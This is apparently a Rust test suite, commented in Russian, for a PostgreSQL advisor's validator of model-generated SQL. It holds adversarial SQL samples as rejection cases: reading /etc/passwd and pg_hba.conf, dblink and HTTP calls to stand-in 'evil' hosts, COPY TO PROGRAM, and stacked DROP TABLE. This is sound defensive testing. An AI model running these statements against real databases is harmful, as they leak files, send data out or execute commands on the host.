//! Враждебный набор для SQL от модели (концепция §12, спец. P4 §7.1, §7.2, §13): каждое выражение отвергается с нужным
//! кодом в каждом назначении, где это предписано; допустимые проходят. Набор проверяет только `check`, поэтому годится
//! и для запасного разбора на лексере (спец. §7.1, откат задачи 1). Плюс поиск запрещённых вызовов в реальных
//! VERBOSE-планах фикстур — без ложных срабатываний.

use pg_advisor::functions::{ADMIN_FUNCTIONS, calls_in_plan, denied_in_plan};
use pg_advisor::sqlcheck::{Checked, FuncRef, Purpose, RejectCode, StatementKind, TableRef, check};

/// Назначения, где SQL — запрос (а не индекс).
const QUERY_PURPOSES: [Purpose; 2] = [Purpose::Explain, Purpose::Select];

#[track_caller]
fn rejected(sql: &str, purpose: Purpose, code: RejectCode) -> String {
    match check(sql, purpose) {
        Ok(c) => panic!("{purpose:?} пропустил {sql:?}: {c:?}"),
        Err(r) => {
            assert_eq!(r.code, code, "{purpose:?} {sql:?}: {}", r.message);
            r.message
        }
    }
}

#[track_caller]
fn accepted(sql: &str, purpose: Purpose) -> Checked {
    match check(sql, purpose) {
        Ok(c) => c,
        Err(r) => panic!(
            "{purpose:?} отверг {sql:?}: {}: {}",
            r.code.as_str(),
            r.message
        ),
    }
}

fn fref(schema: Option<&str>, name: &str) -> FuncRef {
    FuncRef {
        schema: schema.map(str::to_string),
        name: name.to_string(),
    }
}

fn tref(schema: Option<&str>, name: &str) -> TableRef {
    TableRef {
        schema: schema.map(str::to_string),
        name: name.to_string(),
    }
}

/// По вызову на каждый шаблон и группу спеки §7.2 и концепции §12; второе — имя в сообщении.
const FORBIDDEN: &[(&str, &str)] = &[
    ("SELECT pg_sleep(1)", "pg_sleep"),
    ("SELECT pg_sleep_for('1 minute')", "pg_sleep_for"),
    (
        "SELECT pg_sleep_until(now() + interval '1 hour')",
        "pg_sleep_until",
    ),
    (
        "SELECT query_to_xml('DELETE FROM t RETURNING *', true, false, '')",
        "query_to_xml",
    ),
    (
        "SELECT query_to_xml_and_xmlschema('SELECT 1', true, false, '')",
        "query_to_xml_and_xmlschema",
    ),
    (
        "SELECT query_to_xmlschema('SELECT 1', true, false, '')",
        "query_to_xmlschema",
    ),
    (
        "SELECT cursor_to_xml('c', 1, true, false, '')",
        "cursor_to_xml",
    ),
    (
        "SELECT table_to_xml('pg_authid', true, false, '')",
        "table_to_xml",
    ),
    (
        "SELECT schema_to_xml('public', true, false, '')",
        "schema_to_xml",
    ),
    ("SELECT database_to_xml(true, false, '')", "database_to_xml"),
    ("SELECT lo_import('/etc/passwd')", "lo_import"),
    ("SELECT lo_export(16384, '/tmp/x')", "lo_export"),
    ("SELECT lo_get(16384)", "lo_get"),
    (
        "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)",
        "dblink",
    ),
    (
        "SELECT dblink_exec('host=evil', 'DROP TABLE t')",
        "dblink_exec",
    ),
    ("SELECT dblink_connect('c', 'host=evil')", "dblink_connect"),
    ("SELECT pg_advisory_lock(1)", "pg_advisory_lock"),
    (
        "SELECT pg_advisory_xact_lock_shared(1)",
        "pg_advisory_xact_lock_shared",
    ),
    ("SELECT pg_try_advisory_lock(1)", "pg_try_advisory_lock"),
    (
        "SELECT set_config('statement_timeout', '0', false)",
        "set_config",
    ),
    ("SELECT pg_notify('ch', 'payload')", "pg_notify"),
    ("SELECT pg_read_file('/etc/passwd')", "pg_read_file"),
    (
        "SELECT pg_read_binary_file('pg_hba.conf')",
        "pg_read_binary_file",
    ),
    ("SELECT pg_stat_file('postgresql.conf')", "pg_stat_file"),
    ("SELECT * FROM pg_ls_dir('.')", "pg_ls_dir"),
    ("SELECT * FROM pg_ls_waldir()", "pg_ls_waldir"),
    ("SELECT * FROM pg_ls_logdir()", "pg_ls_logdir"),
    (
        "SELECT * FROM pg_logical_slot_get_changes('s', NULL, NULL)",
        "pg_logical_slot_get_changes",
    ),
    (
        "SELECT pg_replication_origin_create('o')",
        "pg_replication_origin_create",
    ),
    ("SELECT pg_backup_start('label')", "pg_backup_start"),
    ("SELECT * FROM pg_backup_stop()", "pg_backup_stop"),
    (
        "SELECT pg_import_system_collations('pg_catalog')",
        "pg_import_system_collations",
    ),
    ("SELECT http_get('http://evil.example/')", "http_get"),
    (
        "SELECT net.http_post(url := 'http://evil.example/')",
        "http_post",
    ),
    (
        "SELECT pg_terminate_backend(pid) FROM pg_stat_activity",
        "pg_terminate_backend",
    ),
    ("SELECT pg_cancel_backend(1)", "pg_cancel_backend"),
    ("SELECT pg_reload_conf()", "pg_reload_conf"),
    (
        "SELECT pg_stat_statements_reset()",
        "pg_stat_statements_reset",
    ),
    (
        "SELECT pg_drop_replication_slot('s')",
        "pg_drop_replication_slot",
    ),
    ("SELECT pg_switch_wal()", "pg_switch_wal"),
    ("SELECT pg_promote()", "pg_promote"),
    (
        "SELECT pg_create_restore_point('x')",
        "pg_create_restore_point",
    ),
    (
        "SELECT pg_log_backend_memory_contexts(1)",
        "pg_log_backend_memory_contexts",
    ),
    ("SELECT pg_file_write('x', 'y', false)", "pg_file_write"),
];

#[test]
fn forbidden_functions_are_rejected_in_every_query_purpose() {
    for (sql, name) in FORBIDDEN {
        for purpose in QUERY_PURPOSES {
            let message = rejected(sql, purpose, RejectCode::ForbiddenFunction);
            assert!(message.contains(name), "{sql:?}: {message}");
        }
    }
}

/// Вызов на любой глубине: подзапросы, CTE (в том числе рекурсивная), LATERAL, выражения FROM, аргументы — и места,
/// куда не заходит `ParseResult::nodes()` pg_query: VALUES, LIMIT / OFFSET, FILTER, окна, именованные аргументы,
/// ARRAY, DISTINCT ON, GROUPING SETS, XMLTABLE, TABLESAMPLE, ветви UNION, индексирование.
const HIDDEN_DEEP: &[&str] = &[
    "SELECT (SELECT pg_sleep(1))",
    "SELECT * FROM t WHERE a IN (SELECT pg_sleep(1))",
    "SELECT 1 WHERE EXISTS (SELECT pg_sleep(1))",
    "SELECT a FROM t WHERE a = ANY (SELECT pg_sleep(1))",
    "SELECT * FROM t, LATERAL (SELECT pg_sleep(1)) s",
    "SELECT * FROM pg_sleep(1)",
    "SELECT * FROM ROWS FROM (generate_series(1, 2), pg_sleep(1)) AS r(a, b)",
    "WITH s AS (SELECT pg_sleep(1)) SELECT * FROM s",
    "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r, pg_sleep(1) WHERE n < 3) SELECT * FROM r",
    "VALUES (1), (pg_sleep(1))",
    "SELECT 1 LIMIT (SELECT 1 FROM pg_sleep(1))",
    "SELECT 1 OFFSET pg_sleep(1)::text::int",
    "SELECT count(*) FILTER (WHERE pg_sleep(1) IS NULL) FROM t",
    "SELECT row_number() OVER (ORDER BY pg_sleep(1)) FROM t",
    "SELECT sum(a) OVER w FROM t WINDOW w AS (PARTITION BY pg_sleep(1))",
    "SELECT ARRAY[pg_sleep(1)]",
    "SELECT ARRAY(SELECT pg_sleep(1))",
    "SELECT CASE WHEN a > 0 THEN pg_sleep(1) END FROM t",
    "SELECT coalesce(NULL, pg_sleep(1))",
    "SELECT greatest(1, pg_sleep(1)::text::int)",
    "SELECT jsonb_build_object('k', pg_sleep(1))",
    "SELECT format('%s', VARIADIC ARRAY[pg_sleep(1)::text])",
    "SELECT my_func(arg => pg_sleep(1))",
    "SELECT DISTINCT ON (pg_sleep(1)) a FROM t",
    "SELECT a FROM t GROUP BY GROUPING SETS ((a), (pg_sleep(1)))",
    "SELECT a FROM t GROUP BY a HAVING count(*) > pg_sleep(1)::text::int",
    "SELECT a FROM t ORDER BY pg_sleep(1)",
    "SELECT x FROM XMLTABLE('/r' PASSING query_to_xml('SELECT 1', true, false, '') COLUMNS x int)",
    "SELECT * FROM t TABLESAMPLE SYSTEM (pg_sleep(1)::text::float4)",
    "SELECT a FROM t UNION SELECT pg_sleep(1)::text",
    "SELECT (pg_sleep(1)::text || 'x')[1]",
    "SELECT * FROM t JOIN u ON pg_sleep(1) IS NOT NULL",
    "SELECT xmlelement(name x, pg_sleep(1))",
    "SELECT row(1, pg_sleep(1))",
    "SELECT 1 FROM t WHERE (a, b) = (1, pg_sleep(1))",
    "SELECT pg_sleep(1) COLLATE \"C\"",
    "SELECT * FROM t WHERE a BETWEEN 1 AND pg_sleep(1)::text::int",
];

#[test]
fn forbidden_calls_are_found_at_any_depth() {
    for sql in HIDDEN_DEEP {
        for purpose in QUERY_PURPOSES {
            rejected(sql, purpose, RejectCode::ForbiddenFunction);
        }
    }
}

/// Имена в кавычках, в другом регистре, со схемой и каталогом; схема `net` целиком; функциональная запись `(row).f`.
#[test]
fn quoted_and_qualified_names_are_still_functions() {
    for (sql, shown) in [
        (r#"SELECT "pg_sleep"(1)"#, "pg_sleep"),
        (r#"SELECT "PG_SLEEP"(1)"#, "PG_SLEEP"),
        ("SELECT PG_SLEEP(1)", "pg_sleep"),
        ("SELECT pg_catalog.pg_sleep(1)", "pg_catalog.pg_sleep"),
        (
            r#"SELECT "pg_catalog"."set_config"('a.b', 'c', false)"#,
            "pg_catalog.set_config",
        ),
        (
            "SELECT mydb.pg_catalog.lo_import('/etc/passwd')",
            "pg_catalog.lo_import",
        ),
        (
            "SELECT net._http_collect_response(1)",
            "net._http_collect_response",
        ),
        (
            "SELECT (ROW('GET', 'http://evil.example/', NULL, NULL, NULL)::http_request).http",
            "http",
        ),
    ] {
        for purpose in QUERY_PURPOSES {
            let message = rejected(sql, purpose, RejectCode::ForbiddenFunction);
            assert!(message.contains(shown), "{sql:?}: {message}");
        }
    }
}

/// DML с запрещённым вызовом: для `Explain` вид выражения допустим, отказ — по функции; для `Select` — по виду.
#[test]
fn forbidden_calls_inside_dml() {
    for sql in [
        "INSERT INTO t (a) VALUES (pg_sleep(1))",
        "INSERT INTO t (a) SELECT 1 ON CONFLICT (a) DO UPDATE SET a = set_config('x.y', '1', false)::int",
        "UPDATE t SET a = 1 RETURNING pg_sleep(1)",
        "UPDATE t SET a = (SELECT lo_import('/etc/passwd'))",
        "DELETE FROM t USING pg_sleep(1) s WHERE true",
        "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN UPDATE SET a = pg_sleep(1)::text",
        "WITH d AS (DELETE FROM t RETURNING pg_sleep(1)) SELECT * FROM d",
    ] {
        rejected(sql, Purpose::Explain, RejectCode::ForbiddenFunction);
        rejected(sql, Purpose::Select, RejectCode::InvalidSql);
    }
}

#[test]
fn multiple_statements_are_rejected() {
    for sql in [
        "SELECT 1; SELECT 2",
        "SELECT 1; DELETE FROM t",
        "SELECT 1 /* x */; DROP TABLE t",
        "SELECT $$a$$; COMMIT",
        "SELECT 1;\nSELECT pg_sleep(1)",
    ] {
        for purpose in QUERY_PURPOSES {
            let message = rejected(sql, purpose, RejectCode::InvalidSql);
            assert!(
                message.contains("Exactly one statement"),
                "{sql:?}: {message}"
            );
        }
    }
}

/// `;` и вызовы внутри комментариев, строк и долларовых кавычек — не выражения и не вызовы.
#[test]
fn semicolons_and_calls_in_comments_and_quotes_are_text() {
    for sql in [
        "SELECT 1 -- ; DELETE FROM t; SELECT pg_sleep(10)\n",
        "SELECT 1 /* ; DELETE FROM t; pg_sleep(10) */",
        "SELECT 1 /* nested /* ; */ pg_sleep(1); */",
        "SELECT $$; DELETE FROM t; $$",
        "SELECT $q$ pg_sleep(1); DROP TABLE t $q$",
        "SELECT 'pg_sleep(1); DROP TABLE t'",
        r"SELECT E'\'; DROP TABLE t; --'",
        "SELECT 1;",
        "SELECT 1; -- trailing\n",
    ] {
        for purpose in QUERY_PURPOSES {
            let c = accepted(sql, purpose);
            assert!(c.functions.is_empty(), "{sql:?}: {:?}", c.functions);
        }
    }
}

/// Служебные команды и всё, что не запрос: `invalid_sql` в обоих назначениях (концепция §12: `CALL`, `DO`, `COPY`;
/// спека §7.1: `EXPLAIN`, `CREATE TABLE AS`, `DECLARE`, `EXECUTE`, `SET`…).
#[test]
fn utility_statements_are_rejected() {
    for sql in [
        "CALL p()",
        "DO $$ BEGIN PERFORM pg_sleep(1); END $$",
        "COPY t TO STDOUT",
        "COPY (SELECT 1) TO PROGRAM 'id'",
        "COPY t FROM '/etc/passwd'",
        "EXPLAIN ANALYZE DELETE FROM t",
        "EXPLAIN (ANALYZE) SELECT 1",
        "CREATE TABLE x AS SELECT 1",
        "CREATE MATERIALIZED VIEW mv AS SELECT 1",
        "DECLARE c CURSOR FOR SELECT 1",
        "PREPARE p AS SELECT 1",
        "EXECUTE p(1)",
        "SET statement_timeout = 0",
        "SET ROLE postgres",
        "RESET ALL",
        "SHOW ALL",
        "BEGIN",
        "COMMIT",
        "VACUUM t",
        "ANALYZE t",
        "TRUNCATE t",
        "DROP TABLE t",
        "ALTER SYSTEM SET work_mem = '1GB'",
        "LOCK TABLE t",
        "NOTIFY ch",
        "LISTEN ch",
        "CREATE FUNCTION f() RETURNS int AS 'SELECT 1' LANGUAGE sql",
        "GRANT SELECT ON t TO PUBLIC",
        "LOAD 'auto_explain'",
        "CHECKPOINT",
        "REFRESH MATERIALIZED VIEW mv",
        "CREATE INDEX ON t (a)",
    ] {
        for purpose in QUERY_PURPOSES {
            rejected(sql, purpose, RejectCode::InvalidSql);
        }
    }
}

/// `Explain` принимает DML (без ANALYZE оно не выполняется), `Select` — только SELECT.
#[test]
fn explain_accepts_dml_select_does_not() {
    for (sql, kind) in [
        ("SELECT * FROM t WHERE a = $1", StatementKind::Select),
        ("INSERT INTO t (a) VALUES ($1)", StatementKind::Insert),
        (
            "UPDATE t SET a = a + 1 WHERE id = $1",
            StatementKind::Update,
        ),
        ("DELETE FROM t WHERE id = 1", StatementKind::Delete),
        (
            "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE",
            StatementKind::Merge,
        ),
    ] {
        assert_eq!(accepted(sql, Purpose::Explain).kind, kind, "{sql}");
        if kind != StatementKind::Select {
            rejected(sql, Purpose::Select, RejectCode::InvalidSql);
        }
    }
}

#[test]
fn select_into_is_rejected() {
    for sql in [
        "SELECT * INTO t2 FROM t",
        "SELECT 1 AS a INTO TEMP x",
        "WITH c AS (SELECT 1 AS a) SELECT * INTO t2 FROM c",
        "SELECT * INTO UNLOGGED t2 FROM t UNION SELECT * FROM t",
    ] {
        for purpose in QUERY_PURPOSES {
            let message = rejected(sql, purpose, RejectCode::InvalidSql);
            assert!(message.contains("INTO"), "{sql:?}: {message}");
        }
    }
}

/// Блокировки строк на любой глубине: `Select` отвергает, `Explain` — нет (без выполнения строки не блокируются).
#[test]
fn row_locks_are_rejected_for_select() {
    for sql in [
        "SELECT * FROM t FOR UPDATE",
        "SELECT * FROM t FOR NO KEY UPDATE",
        "SELECT * FROM t FOR SHARE",
        "SELECT * FROM t FOR KEY SHARE SKIP LOCKED",
        "SELECT * FROM t FOR UPDATE OF t NOWAIT",
        "SELECT * FROM (SELECT * FROM t FOR UPDATE) s",
        "WITH c AS (SELECT * FROM t FOR NO KEY UPDATE) SELECT * FROM c",
        "SELECT * FROM t WHERE a IN (SELECT a FROM u FOR SHARE)",
        "SELECT 1 UNION ALL (SELECT 1 FROM t FOR UPDATE)",
    ] {
        let message = rejected(sql, Purpose::Select, RejectCode::InvalidSql);
        assert!(message.contains("FOR UPDATE"), "{sql:?}: {message}");
        assert_eq!(
            accepted(sql, Purpose::Explain).kind,
            StatementKind::Select,
            "{sql}"
        );
    }
}

/// Изменяющие CTE: `Select` отвергает на любой глубине; `Explain` принимает выражение верхнего уровня (вид — SELECT).
#[test]
fn modifying_ctes_are_rejected_for_select() {
    for sql in [
        "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d",
        "WITH u AS (UPDATE t SET a = 1 RETURNING *) SELECT 1",
        "WITH i AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM i",
        "WITH a AS (SELECT 1), d AS (DELETE FROM t RETURNING *) SELECT * FROM a",
    ] {
        let message = rejected(sql, Purpose::Select, RejectCode::InvalidSql);
        assert!(message.contains("WITH"), "{sql:?}: {message}");
        assert_eq!(
            accepted(sql, Purpose::Explain).kind,
            StatementKind::Select,
            "{sql}"
        );
    }
    for sql in [
        "SELECT * FROM (WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d) s",
        "WITH m AS (MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE RETURNING t.*) SELECT 1",
    ] {
        rejected(sql, Purpose::Select, RejectCode::InvalidSql);
    }
}

/// `HypoIndex`: правило P3b `validate_ddl` — одно `CREATE INDEX ON …` без имени, `CONCURRENTLY` и `UNIQUE`.
#[test]
fn hypothetical_index_follows_the_p3b_rule() {
    for (sql, table) in [
        (
            "CREATE INDEX ON shop.orders (customer_id)",
            tref(Some("shop"), "orders"),
        ),
        (
            "create index on t using btree (a, b desc) where c > 0",
            tref(None, "t"),
        ),
        ("CREATE INDEX ON t (lower(email))", tref(None, "t")),
        (
            "CREATE INDEX ON t USING gin (doc jsonb_path_ops)",
            tref(None, "t"),
        ),
        ("CREATE INDEX ON t (a) INCLUDE (b)", tref(None, "t")),
        ("CREATE INDEX ON t (a);", tref(None, "t")),
    ] {
        let c = accepted(sql, Purpose::HypoIndex);
        assert_eq!(c.kind, StatementKind::CreateIndex, "{sql}");
        assert_eq!(c.tables, vec![table], "{sql}");
    }
    for (sql, word) in [
        ("CREATE UNIQUE INDEX ON t (a)", "UNIQUE"),
        ("CREATE INDEX CONCURRENTLY ON t (a)", "CONCURRENTLY"),
        ("CREATE INDEX idx ON t (a)", "name"),
        ("CREATE INDEX IF NOT EXISTS idx ON t (a)", "name"),
        (
            "CREATE INDEX ON t (a); DROP TABLE t",
            "Exactly one statement",
        ),
        ("SELECT 1", "CREATE INDEX"),
        ("CREATE TABLE x (a int)", "CREATE INDEX"),
        ("DROP INDEX i", "CREATE INDEX"),
        ("REINDEX TABLE t", "CREATE INDEX"),
        ("ALTER TABLE t ADD PRIMARY KEY (a)", "CREATE INDEX"),
    ] {
        let message = rejected(sql, Purpose::HypoIndex, RejectCode::InvalidSql);
        assert!(message.contains(word), "{sql:?}: {message}");
    }
    for sql in [
        "CREATE INDEX ON t ((pg_sleep(1)::text))",
        "CREATE INDEX ON t (a) WHERE set_config('a.b', 'c', false) IS NOT NULL",
    ] {
        rejected(sql, Purpose::HypoIndex, RejectCode::ForbiddenFunction);
    }
}

/// Допустимые (спека §13): TABLE, VALUES, оконные функции, LATERAL, рекурсивная CTE, функции PostGIS и обычные запросы.
#[test]
fn ordinary_queries_pass() {
    for sql in [
        "TABLE shop.orders",
        "VALUES (1, 'a'), (2, 'b')",
        "SELECT a, row_number() OVER (PARTITION BY b ORDER BY c) FROM t",
        "SELECT sum(a) OVER w FROM t WINDOW w AS (ORDER BY b ROWS BETWEEN 1 PRECEDING AND CURRENT ROW)",
        "SELECT * FROM t, LATERAL (SELECT * FROM u WHERE u.t_id = t.id ORDER BY u.at DESC LIMIT 1) last",
        "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 10) SELECT * FROM r",
        "WITH x AS MATERIALIZED (SELECT 1) SELECT * FROM x",
        "SELECT ST_AsText(ST_Buffer(geom, 10)) FROM places WHERE ST_DWithin(geom::geography, ST_MakePoint(37.6, 55.7)::geography, 1000)",
        "SELECT * FROM generate_series(1, 10) g",
        "SELECT now(), current_setting('work_mem'), pg_size_pretty(pg_total_relation_size('t'))",
        "SELECT lo, http, dblink FROM t",
        "SELECT 'pg_sleep(1)', $$query_to_xml$$",
        "SELECT * FROM t WHERE a = $1 AND b = ANY($2)",
        "SELECT my_func(1)",
        "SELECT count(*) FILTER (WHERE a > 0) FROM t GROUP BY GROUPING SETS ((a), ())",
        "SELECT * FROM JSON_TABLE('[{\"a\":1}]', '$[*]' COLUMNS (a int PATH '$.a')) jt",
        "SELECT 0x1F, 1_000_000",
        "SELECT * FROM t1 FULL JOIN t2 USING (id)",
        "SELECT extract(year FROM now()), substring('abc' FROM 2), trim(' a ')",
    ] {
        for purpose in QUERY_PURPOSES {
            assert_eq!(accepted(sql, purpose).kind, StatementKind::Select, "{sql}");
        }
    }
}

#[test]
fn checked_lists_functions_and_tables_in_text_order() {
    let c = accepted(
        "SELECT o.id, lower(c.email) FROM shop.orders o JOIN customers c ON c.id = o.customer_id \
         WHERE o.status = ANY($1) AND pg_catalog.length(c.email) > 3 AND lower(c.region) = 'eu'",
        Purpose::Select,
    );
    assert_eq!(
        c.functions,
        vec![fref(None, "lower"), fref(Some("pg_catalog"), "length")]
    );
    assert_eq!(
        c.tables,
        vec![tref(Some("shop"), "orders"), tref(None, "customers")]
    );
    let w = accepted(
        "WITH recent AS (SELECT * FROM shop.events) SELECT * FROM recent JOIN shop.orders USING (id)",
        Purpose::Select,
    );
    assert_eq!(
        w.tables,
        vec![tref(Some("shop"), "events"), tref(Some("shop"), "orders")],
        "имя CTE — не таблица"
    );
    let ins = accepted(
        "INSERT INTO shop.audit (order_id, actor) SELECT id, 'x' FROM shop.orders",
        Purpose::Explain,
    );
    assert_eq!(ins.kind, StatementKind::Insert);
    assert_eq!(
        ins.tables,
        vec![tref(Some("shop"), "audit"), tref(Some("shop"), "orders")],
        "цель INSERT (поле без обёртки узла) — тоже таблица"
    );
}

#[test]
fn broken_and_empty_text_is_invalid_sql() {
    for purpose in [Purpose::Explain, Purpose::HypoIndex, Purpose::Select] {
        let message = rejected("SELEC 1", purpose, RejectCode::InvalidSql);
        assert!(message.contains("syntax error"), "{message}");
        rejected("", purpose, RejectCode::InvalidSql);
        rejected("  -- only a comment\n", purpose, RejectCode::InvalidSql);
        rejected("/* only a comment */", purpose, RejectCode::InvalidSql);
        rejected("SELECT 1\0", purpose, RejectCode::InvalidSql);
        rejected("SELECT 1 \\gexec", purpose, RejectCode::InvalidSql);
    }
}

/// Глубокое дерево не прячет вызов: либо отказ по глубине (`invalid_sql`), либо найденный вызов — но не `Ok`.
#[test]
fn deep_trees_never_hide_a_call() {
    let deep = format!("SELECT pg_sleep(1){}", " + 1".repeat(300));
    for purpose in QUERY_PURPOSES {
        let r = check(&deep, purpose).expect_err("глубокое дерево не проходит");
        assert!(
            matches!(
                r.code,
                RejectCode::InvalidSql | RejectCode::ForbiddenFunction
            ),
            "{r:?}"
        );
    }
    let moderate = format!("SELECT 1{}", " + 1".repeat(20));
    for purpose in QUERY_PURPOSES {
        accepted(&moderate, purpose);
    }
}

/// Реальные VERBOSE-планы фикстур (pg-perf, матрица): ни запрещённых, ни административных вызовов — ложных срабатываний
/// поиска нет.
#[test]
fn real_verbose_plans_have_no_denied_calls() {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/plans/json");
    let mut count = 0;
    for entry in std::fs::read_dir(&dir).expect("каталог фикстур") {
        let path = entry.unwrap().path();
        if path.extension().and_then(|e| e.to_str()) != Some("json") {
            continue;
        }
        count += 1;
        let v: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(denied_in_plan(&v), None, "{path:?}");
        assert!(calls_in_plan(&v, ADMIN_FUNCTIONS).is_empty(), "{path:?}");
    }
    assert!(count >= 10, "фикстуры на месте: {count}");
}
